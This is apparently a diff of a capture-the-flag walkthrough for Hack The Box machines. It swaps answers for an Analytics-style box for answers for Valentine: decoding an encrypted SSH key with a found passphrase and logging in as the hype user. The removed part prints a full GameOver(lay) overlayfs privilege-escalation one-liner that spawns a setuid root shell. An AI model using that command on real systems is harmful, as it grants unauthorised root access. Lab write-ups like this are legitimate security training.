@@ -188,47 +188,17 @@ heartbleedbelievethehype
 
 ### 2.5 - What is the relative path of a folder on the website that contains two interesting files, including note.txt?
 
-
-
-
-
 Going to 'hidden' web dir discovered using gobuster: /dev we can see that there're two interesting files:
+
+<figure><img src="../.gitbook/assets/image (323).png" alt=""><figcaption></figcaption></figure>
 
 notes.txt
 
 <figure><img src="../.gitbook/assets/image (317).png" alt=""><figcaption></figcaption></figure>
 
-
-
-
-
-
-
 hype\_key
 
 <figure><img src="../.gitbook/assets/image (319).png" alt=""><figcaption></figcaption></figure>
-
-
-
-
-
-
-
-
-
-Decoding the base64 reveals the passphrase for `hype_key`, which can be used to connect via SSH as the `hype` user.
-
-
-
-
-
-
-
-
-
-
-
-
 
 {% hint style="info" %}
 /dev
@@ -238,17 +208,9 @@ Decoding the base64 reveals the passphrase for `hype_key`, which can be used to 
 
 
 
+hype\_key
 
-
-
-
-
-
-This questions take us an important hint to understand what we can do.
-
-Infact, using command export, that show us environment variable we found credentials
-
-<figure><img src="../.gitbook/assets/image (296).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (319).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="info" %}
 hype\_key
@@ -258,13 +220,35 @@ hype\_key
 
 ### 3.1 - Submit the flag located in the hype user's home directory.
 
-Upon checking with `sudo -l`, we found that we do not have permissions. However, considering we have discovered another open port 22 (SSH), we can attempt to use the credentials we just found to log in.
+We can convert hype\_key (hex) to ASCII
 
-`ssh metalytics@analytics.htb`
+<figure><img src="../.gitbook/assets/image (324).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/image (297).png" alt=""><figcaption></figcaption></figure>
+and we obtain an encrypted RSA private key (maybe as id\_rsa to SSH access), saved into id\_rsa\_psw.
 
-<figure><img src="../.gitbook/assets/image (298).png" alt=""><figcaption></figcaption></figure>
+<div align="left">
+
+<figure><img src="../.gitbook/assets/image (325).png" alt=""><figcaption></figcaption></figure>
+
+</div>
+
+We just know an hypotetic password: heartbleedbelievethehype then we can try decode it:
+
+`openssl rsa -in id_rsa_psw`
+
+<div align="left">
+
+<figure><img src="../.gitbook/assets/image (326).png" alt=""><figcaption></figcaption></figure>
+
+</div>
+
+
+
+
+
+`ssh hype@valentine.htb -i id_rsa`
+
+
 
 <details>
 
@@ -274,56 +258,37 @@ Upon checking with `sudo -l`, we found that we do not have permissions. However,
 
 </details>
 
-### 3.2 - What kernel version is installed on the host system?
+### 3.2 - What is the name of the terminal multiplexing software that the hype user has run previously?
 
-We use `uname -a` command to display kernel version
 
-<div align="left">
 
-<figure><img src="../.gitbook/assets/image (299).png" alt=""><figcaption></figcaption></figure>
 
-</div>
 
 {% hint style="info" %}
-6.2.0-25-generic
+tmux
 {% endhint %}
 
-### 3.3 - What Ubuntu release is the system running?
-
-We can use `lsb_release -a` or `cat /etc/os-release`\
+### 3.3 - What is the full path to the socket file used by the tmux session?
 
 
-<figure><img src="../.gitbook/assets/image (300).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="info" %}
-UBUNTU 22.04.03 LTS (JAMMY)
+/.devs/dev\_sess
 {% endhint %}
 
-### 3.4 - What component used by the Ubuntu operating system on the target system is vulnerable to a privileges escalation vulnerability assigned two 2023 CVEs?
+### 3.4 - What user is that tmux session running as?
 
-After finding an old version of the kernel, I'll search on Google to find a public exploit.
 
-{% embed url="https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629" %}
 
 {% hint style="info" %}
-overlayfs
+root
 {% endhint %}
 
 ### Task 4 - Find root flag
 
-### 4.1 - Submit the flag located in the root user's home directory.
+### 4.1 - Submit the flag located in root's home directory.
 
-As explained into github below, we can do GameOver(lay) Ubuntu Privilege Escalation
 
-{% embed url="https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629?source=post_page-----fd256a170fae--------------------------------" %}
-
-Then, executing bash script, we have become root and can now access the root flag.
-
-```bash
-unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'
-```
-
-<figure><img src="../.gitbook/assets/image (301).png" alt=""><figcaption></figcaption></figure>
 
 <details>
 
@@ -332,5 +297,3 @@ unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/pyt
 2ec3181b64936d66aae6e2bc1215a477
 
 </details>
-
-<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
